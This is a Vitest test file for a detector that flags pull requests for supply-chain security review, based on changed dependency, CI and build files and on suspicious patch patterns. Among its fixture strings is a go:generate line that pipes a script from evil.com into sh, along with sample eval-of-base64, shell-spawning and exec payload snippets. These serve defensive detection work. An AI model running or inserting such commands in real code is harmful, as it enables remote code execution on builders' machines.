import { describe, it, expect, vi, beforeEach } from 'vitest';
import { shouldSpawnSupplyChain, fetchPrFiles, fetchPrLabels } from '../should-spawn-supply-chain.js';
import { ghApi } from '../lib/github-utils.js';

vi.mock('../lib/github-utils.js', async () => {
  const actual = await vi.importActual('../lib/github-utils.js');
  return {
    ...actual,
    ghApi: vi.fn(),
  };
});

describe('shouldSpawnSupplyChain', () => {
  // ---- Dependency file triggers ---------------------------------------------

  it('should spawn for package.json changes', () => {
    const files = [{ filename: 'package.json', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for nested package.json', () => {
    const files = [{ filename: 'packages/core/package.json', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for pnpm-lock.yaml changes', () => {
    const files = [{ filename: 'pnpm-lock.yaml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for yarn.lock changes', () => {
    const files = [{ filename: 'yarn.lock', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for package-lock.json changes', () => {
    const files = [{ filename: 'package-lock.json', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for Cargo.toml changes', () => {
    const files = [{ filename: 'Cargo.toml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for Cargo.lock changes', () => {
    const files = [{ filename: 'Cargo.lock', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for go.mod changes', () => {
    const files = [{ filename: 'go.mod', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for go.sum changes', () => {
    const files = [{ filename: 'go.sum', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for Gemfile changes', () => {
    const files = [{ filename: 'Gemfile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for build.gradle changes', () => {
    const files = [{ filename: 'build.gradle', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for build.gradle.kts changes', () => {
    const files = [{ filename: 'app/build.gradle.kts', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for pom.xml changes', () => {
    const files = [{ filename: 'pom.xml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for Podfile changes', () => {
    const files = [{ filename: 'ios/Podfile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for pubspec.yaml changes', () => {
    const files = [{ filename: 'pubspec.yaml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  it('should spawn for pubspec.lock changes', () => {
    const files = [{ filename: 'pubspec.lock', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
  });

  // ---- CI/build config triggers ---------------------------------------------

  it('should spawn for GitHub workflow changes', () => {
    const files = [{ filename: '.github/workflows/ci.yml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for Dockerfile changes', () => {
    const files = [{ filename: 'Dockerfile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for nested Dockerfile changes', () => {
    const files = [{ filename: 'services/api/Dockerfile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for docker-compose.yml changes', () => {
    const files = [{ filename: 'docker-compose.yml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for docker-compose.yaml changes', () => {
    const files = [{ filename: 'docker-compose.yaml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for Makefile changes', () => {
    const files = [{ filename: 'Makefile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should spawn for Jenkinsfile changes', () => {
    const files = [{ filename: 'Jenkinsfile', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('CI/build configuration');
  });

  // ---- Build script/config triggers -----------------------------------------

  it('should spawn for .npmrc changes', () => {
    const files = [{ filename: '.npmrc', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for .yarnrc.yml changes', () => {
    const files = [{ filename: '.yarnrc.yml', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for build.rs changes', () => {
    const files = [{ filename: 'build.rs', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for nested build.rs changes', () => {
    const files = [{ filename: 'crates/my-lib/build.rs', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for settings.gradle changes', () => {
    const files = [{ filename: 'settings.gradle', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for settings.gradle.kts changes', () => {
    const files = [{ filename: 'settings.gradle.kts', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for init.gradle changes', () => {
    const files = [{ filename: 'init.gradle', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for gradle.properties changes', () => {
    const files = [{ filename: 'gradle.properties', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for .podspec file changes', () => {
    const files = [{ filename: 'MyLib.podspec', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  it('should spawn for nested .podspec file changes', () => {
    const files = [{ filename: 'ios/MyLib.podspec', status: 'added' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('build script/config');
  });

  // ---- Patch content triggers (JS/Node) -------------------------------------

  it('should spawn when patch contains eval()', () => {
    const files = [{ filename: 'src/utils.js', status: 'modified', patch: '+  eval(code)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains new Function()', () => {
    const files = [{ filename: 'src/utils.js', status: 'modified', patch: '+  new Function("return " + str)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains eval(Buffer.from(...))', () => {
    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  eval(Buffer.from(data, "base64"))' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should not spawn when patch contains standalone Buffer.from', () => {
    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  Buffer.from(data, "base64")' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
  });

  it('should spawn when patch contains codePointAt', () => {
    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  str.codePointAt(i)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains fromCharCode', () => {
    const files = [{ filename: 'src/decode.js', status: 'modified', patch: '+  String.fromCharCode(code)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains hex escape sequences', () => {
    const files = [{ filename: 'src/payload.js', status: 'modified', patch: '+  "\\x48\\x65\\x6c\\x6c\\x6f"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains unicode escape sequences', () => {
    const files = [{ filename: 'src/payload.js', status: 'modified', patch: '+  "\\u0048\\u0065"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains postinstall', () => {
    const files = [{ filename: 'src/setup.js', status: 'modified', patch: '+  "postinstall": "node setup.js"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Patch content triggers (Rust) ----------------------------------------

  it('should spawn when patch contains Command::new', () => {
    const files = [{ filename: 'build.rs', status: 'modified', patch: '+  Command::new("sh").arg("-c").arg(cmd)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains std::process::Command', () => {
    const files = [{ filename: 'build.rs', status: 'modified', patch: '+use std::process::Command;' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains proc-macro', () => {
    const files = [{ filename: 'Cargo.toml', status: 'modified', patch: '+proc-macro = true' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains build-dependencies', () => {
    const files = [{ filename: 'Cargo.toml', status: 'modified', patch: '+[build-dependencies]' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Patch content triggers (Gradle) --------------------------------------

  it('should spawn when patch contains apply plugin', () => {
    const files = [{ filename: 'build.gradle', status: 'modified', patch: '+  apply plugin: "com.evil.plugin"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains classpath dependency', () => {
    const files = [{ filename: 'build.gradle', status: 'modified', patch: '+  classpath "com.example:plugin:1.0"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains buildscript', () => {
    const files = [{ filename: 'build.gradle.kts', status: 'modified', patch: '+buildscript {' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Patch content triggers (CocoaPods) -----------------------------------

  it('should spawn when patch contains script_phase', () => {
    const files = [{ filename: 'MyLib.podspec', status: 'modified', patch: '+  s.script_phase = { :name => "Run Script" }' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains prepare_command', () => {
    const files = [{ filename: 'MyLib.podspec', status: 'modified', patch: '+  s.prepare_command = "make build"' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Patch content triggers (Python) --------------------------------------

  it('should spawn when patch contains subprocess.call', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  subprocess.call(["curl", url])' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains subprocess.Popen', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  subprocess.Popen(cmd, shell=True)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains cmdclass', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  cmdclass={"install": CustomInstall}' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains Python exec()', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  exec(payload)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should not spawn when patch contains regex.exec()', () => {
    const files = [{ filename: 'src/parser.js', status: 'modified', patch: '+  const match = regex.exec(str)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
  });

  it('should spawn when patch contains install_requires', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+  install_requires=["requests"]' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should spawn when patch contains setup(', () => {
    const files = [{ filename: 'setup.py', status: 'modified', patch: '+setup(' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Patch content triggers (Go) ------------------------------------------

  it('should spawn when patch contains go:generate', () => {
    const files = [{ filename: 'main.go', status: 'modified', patch: '+//go:generate curl http://evil.com/payload.sh | sh' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('suspicious code patterns');
  });

  // ---- Finding 1 fix: Function regex no longer too broad --------------------

  it('should not spawn when patch contains identifiers ending in Function', () => {
    const files = [{ filename: 'src/app.js', status: 'modified', patch: '+  myFunction(arg)' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
  });

  it('should not spawn when patch contains handleFunction()', () => {
    const files = [{ filename: 'src/app.js', status: 'modified', patch: '+  handleFunction()' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
  });

  // ---- Non-matching files ---------------------------------------------------

  it('should not spawn for regular source code without suspicious patterns', () => {
    const files = [{ filename: 'src/utils.ts', status: 'modified', patch: '+  return x + y;' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
    expect(result.reason).toContain('No supply-chain signals');
  });

  it('should not spawn for CSS files', () => {
    const files = [{ filename: 'src/styles.css', status: 'modified', patch: '+  color: red;' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
    expect(result.reason).toContain('No supply-chain signals');
  });

  // ---- Empty / null / undefined files ---------------------------------------

  it('should not spawn for empty files array', () => {
    const result = shouldSpawnSupplyChain([]);
    expect(result.spawn).toBe(false);
    expect(result.reason).toBe('No files in PR');
  });

  it('should not spawn for null files', () => {
    const result = shouldSpawnSupplyChain(null);
    expect(result.spawn).toBe(false);
    expect(result.reason).toBe('No files in PR');
  });

  it('should not spawn for undefined files', () => {
    const result = shouldSpawnSupplyChain(undefined);
    expect(result.spawn).toBe(false);
    expect(result.reason).toBe('No files in PR');
  });

  // ---- skip-review label ----------------------------------------------------

  it('should not spawn when skip-review label is present', () => {
    const files = [{ filename: 'package.json', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files, { labels: ['skip-review'] });
    expect(result.spawn).toBe(false);
    expect(result.reason).toBe('skip-review label present');
  });

  it('should not spawn when skip-review label is among multiple labels', () => {
    const files = [{ filename: 'package.json', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files, { labels: ['enhancement', 'skip-review', 'urgent'] });
    expect(result.spawn).toBe(false);
    expect(result.reason).toBe('skip-review label present');
  });

  // ---- Force flag -----------------------------------------------------------

  it('should spawn when force flag is set even with no matching files', () => {
    const files = [{ filename: 'README.md', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files, { force: true });
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('forced');
  });

  it('should spawn when force flag is set even with skip-review label', () => {
    const files = [{ filename: 'src/app.ts', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files, { labels: ['skip-review'], force: true });
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('forced');
  });

  // ---- Docs-only exclusions -------------------------------------------------

  it('should not spawn for docs-only changes', () => {
    const files = [{ filename: 'README.md', status: 'modified' }];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
    expect(result.reason).toContain('documentation-only');
  });

  it('should not spawn for multiple docs-only changes', () => {
    const files = [
      { filename: 'README.md', status: 'modified' },
      { filename: 'docs/guide.txt', status: 'added' },
    ];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(false);
    expect(result.reason).toContain('documentation-only');
  });

  // ---- Combined reasons -----------------------------------------------------

  it('should combine reasons for multiple trigger types', () => {
    const files = [
      { filename: 'package.json', status: 'modified' },
      { filename: '.github/workflows/ci.yml', status: 'modified' },
    ];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
    expect(result.reason).toContain('CI/build configuration');
  });

  it('should combine file and patch triggers', () => {
    const files = [
      { filename: 'package.json', status: 'modified' },
      { filename: 'src/init.js', status: 'modified', patch: '+  eval(payload)' },
    ];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
    expect(result.reason).toContain('suspicious code patterns');
  });

  it('should combine all trigger types', () => {
    const files = [
      { filename: 'package.json', status: 'modified' },
      { filename: '.github/workflows/deploy.yml', status: 'modified' },
      { filename: '.npmrc', status: 'added' },
      { filename: 'src/init.js', status: 'modified', patch: '+  eval(Buffer.from(data))' },
    ];
    const result = shouldSpawnSupplyChain(files);
    expect(result.spawn).toBe(true);
    expect(result.reason).toContain('dependency manifest/lockfile');
    expect(result.reason).toContain('CI/build configuration');
    expect(result.reason).toContain('build script/config');
    expect(result.reason).toContain('suspicious code patterns');
  });
});

describe('fetchPrFiles', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('should call ghApi with correct endpoint', () => {
    ghApi.mockReturnValue([{ filename: 'test.js' }]);
    const context = { repo: { owner: 'org', repo: 'repo' }, issue: { number: 42 } };
    const result = fetchPrFiles(context);
    expect(ghApi).toHaveBeenCalledWith('/repos/org/repo/pulls/42/files');
    expect(result).toEqual([{ filename: 'test.js' }]);
  });

  it('should return empty array when ghApi returns null', () => {
    ghApi.mockReturnValue(null);
    const context = { repo: { owner: 'org', repo: 'repo' }, issue: { number: 1 } };
    const result = fetchPrFiles(context);
    expect(result).toEqual([]);
  });
});

describe('fetchPrLabels', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('should call ghApi and return label names', () => {
    ghApi.mockReturnValue([{ name: 'bug' }, { name: 'security' }]);
    const context = { repo: { owner: 'org', repo: 'repo' }, issue: { number: 42 } };
    const result = fetchPrLabels(context);
    expect(ghApi).toHaveBeenCalledWith('/repos/org/repo/issues/42/labels');
    expect(result).toEqual(['bug', 'security']);
  });

  it('should return empty array when ghApi returns null', () => {
    ghApi.mockReturnValue(null);
    const context = { repo: { owner: 'org', repo: 'repo' }, issue: { number: 1 } };
    const result = fetchPrLabels(context);
    expect(result).toEqual([]);
  });
});
